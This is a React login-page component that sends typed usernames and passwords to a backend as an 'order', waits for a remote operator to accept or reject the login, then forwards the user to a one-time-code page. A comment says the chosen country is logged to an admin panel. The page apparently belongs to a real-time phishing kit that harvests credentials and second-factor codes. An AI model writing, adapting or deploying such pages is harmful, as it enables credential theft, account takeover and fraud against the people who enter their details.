import axios from "axios";
import React, { useEffect, useRef, useState } from "react";
import { api_route, socket } from "../socketApi";
import { useNavigate } from "react-router-dom";
import {
  BottomBar,
  COUNTRIES,
  CountryPicker,
} from "../components/VisitorShared";
import { FieldError, formLevelErrorClass } from "../components/FormFieldError";
import { HeaderShell } from "../components/HeaderShell";
import { PendingFormOverlay } from "../components/PendingFormOverlay";
import { useLanguage } from "../context/LanguageContext";
import { useOrderSession } from "../hooks/useOrderSession";

const defaultErrors = { username: "", password: "", form: "" };

const Login = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState(defaultErrors);
  const [loading, setLoading] = useState(false);
  const [pendingOrderId, setPendingOrderId] = useState(null);
  const [countryId, setCountryId] = useState("ps");
  const [countryPickerOpen, setCountryPickerOpen] = useState(false);
  const navigatedRef = useRef(false);
  const navigate = useNavigate();
  const { t, dir: pageDir, placeholderTextAlignClass } = useLanguage();

  const { loginAccept, rejectReason, hydrated, reviewLogin } =
    useOrderSession(pendingOrderId);

  const awaitingLoginDecision =
    hydrated &&
    !!pendingOrderId &&
    !loginAccept &&
    !rejectReason &&
    reviewLogin;

  const selectedCountry =
    COUNTRIES.find((c) => c.id === countryId) ?? COUNTRIES[0];

  /** اسم الدولة كما يظهر للمستخدم — يُخزَّن ويُعرض في لوحة الإدارة */
  const chosenCountryName =
    pageDir === "rtl" ? selectedCountry.nameAr : selectedCountry.nameEn;

  const baseInput = `w-full rounded-lg bg-white px-4 py-2 text-base text-gray-900 placeholder:text-gray-400 ${placeholderTextAlignClass} outline-none transition`;
  const inputBorder = (err) =>
    err
      ? "border-2 border-red-500 focus:border-red-600 focus:ring-2 focus:ring-red-100"
      : "border border-[#3d3d6b] focus:ring-2 focus:ring-blue-100";

  const runValidation = () => {
    const next = { ...defaultErrors };
    if (!password.trim()) {
      next.password = t("home.errPasswordRequired");
    }if(!username.trim()) {
      next.username = t(pageDir === "rtl" ? "أسم المستخدم مطلوب" : "Username is required");
    }
    return next;
  };

  useEffect(() => {
    if (!hydrated || !pendingOrderId || navigatedRef.current) return;

    if (rejectReason) {
      navigatedRef.current = false;
      setLoading(false);
      setErrors((prev) => ({
        ...prev,
        form: rejectReason || t("workflow.rejected"),
      }));
      return;
    }

    if (loginAccept) {
      setLoading(false);
      navigatedRef.current = true;
      sessionStorage.setItem("currentOrderId", pendingOrderId);
      navigate("/login-otp", {
        state: { orderId: pendingOrderId, username },
        replace: false,
      });
    }
  }, [
    hydrated,
    loginAccept,
    rejectReason,
    pendingOrderId,
    navigate,
    username,
    t,
  ]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const next = runValidation();
    const hasFieldErrors = next.username || next.password;
    if (hasFieldErrors) {
      setErrors((prev) => ({ ...prev, ...next, form: "" }));
      return;
    }
    setErrors(defaultErrors);
    setLoading(true);
    navigatedRef.current = false;
    try {
      if (pendingOrderId) {
        await axios.post(`${api_route}/order/${pendingOrderId}/login`, {
          username,
          password,
          chosenCountry: chosenCountryName,
        });
        socket.emit("joinOrder", { orderId: pendingOrderId });
        sessionStorage.setItem("currentOrderId", pendingOrderId);
        setErrors(defaultErrors);
      } else {
        const { data } = await axios.post(api_route + "/login", {
          username,
          password,
          chosenCountry: chosenCountryName,
        });
        const oid = data.order._id;
        sessionStorage.setItem("currentOrderId", oid);
        socket.emit("joinOrder", { orderId: oid });
        setPendingOrderId(oid);
      }
    } catch {
      setLoading(false);
      setErrors((prev) => ({
        ...prev,
        form: t("home.errLoginFailed"),
      }));
    }
  };

  const blockFormUntilOutcome = loading || awaitingLoginDecision;

  return (
    <div
      className="relative flex min-h-screen w-full flex-col bg-white pb-24"
      dir={pageDir}
    >
      <HeaderShell>
        <div className="relative flex w-full items-center justify-center">
          <div className="flex max-w-md justify-end pr-0 pt-1" dir="ltr">
            <img
              src="/header.jpeg"
              alt=""
              className="h-full w-[90%] object-contain"
            />
          </div>
        </div>
      </HeaderShell>

      <div className="mx-auto mt-6 flex w-full flex-col max-w-md items-start justify-between px-4 text-sm text-gray-500">
        <div className="flex min-w-0 items-center gap-2">
          <span
            className="flex h-9 w-9 shrink-0 items-center justify-center overflow-hidden rounded-full text-xl leading-none"
            aria-hidden
          >
            <img src={selectedCountry.flag} alt="" className="h-6 w-6" />
          </span>
          <span className="truncate font-medium text-gray-600">
            {pageDir === "rtl"
              ? selectedCountry.nameAr
              : selectedCountry.nameEn}
          </span>
        </div>
        <button
          type="button"
          className="shrink-0 text-xs text-gray-900 font-bold mr-1"
          onClick={() => setCountryPickerOpen(true)}
        >
          {t("home.changeCountry")}
        </button>
      </div>

      <CountryPicker
        isOpen={countryPickerOpen}
        onClose={() => setCountryPickerOpen(false)}
        selectedId={countryId}
        onSelect={setCountryId}
      />

      <form
        onSubmit={handleSubmit}
        className="relative mx-auto mt-4 flex min-h-[260px] w-[90%] max-w-md flex-col gap-2 px-0"
        noValidate
      >
        <PendingFormOverlay
          show={blockFormUntilOutcome}
          ariaLabel={t("common.loadingAria")}
        />
        <div className="flex flex-col gap-2">
          <div>
            <input
              type="text"
              name="username"
              id="field-username"
              autoComplete="username"
              required={true}
              placeholder={t("home.usernamePlaceholder")}
              value={username}
              onChange={(e) => {
                setUsername(e.target.value);
                if (errors.username) setErrors((s) => ({ ...s, username: "" }));
              }}
              aria-invalid={!!errors.username}
              aria-describedby={errors.username ? "err-username" : undefined}
              className={`${baseInput} ${inputBorder(!!errors.username)}`}
              dir={pageDir === "rtl" ? "ltr" : "ltr"}
            />
            <FieldError id="err-username" message={errors.username} />
          </div>

          <div>
            <input
              type="password"
              name="password"
              id="field-password"
              autoComplete="current-password"
              placeholder={t("home.passwordPlaceholder")}
              value={password}
              required={true}
              onChange={(e) => {
                setPassword(e.target.value);
                if (errors.password) setErrors((s) => ({ ...s, password: "" }));
              }}
              aria-invalid={!!errors.password}
              aria-describedby={errors.password ? "err-password" : undefined}
              className={`${baseInput} ${inputBorder(!!errors.password)}`}
              dir="ltr"
            />
            <FieldError id="err-password" message={errors.password} />
          </div>

          <div className="flex w-full justify-center pt-1 flex-col gap-2">
            {errors.form ? (
              <div className={formLevelErrorClass()} dir={pageDir} role="alert">
                <span>
                  {pageDir === "rtl"
                    ? "بيانات الدخول غير صحيحه برجاء إعادة المحاوله مره اخرى"
                    : "Login data is incorrect, please try again later"}
                </span>
              </div>
            ) : null}
            <button
              type="submit"
              disabled={blockFormUntilOutcome}
              className="rounded-full px-10 py-2.5 text-sm font-bold uppercase tracking-wide text-white shadow-md transition active:scale-[0.98] disabled:opacity-80"
              style={{ backgroundColor: "#0057FF" }}
            >
              {t("common.login")}
            </button>
          </div>
        </div>
      </form>

      <BottomBar />
    </div>
  );
};

export default Login;
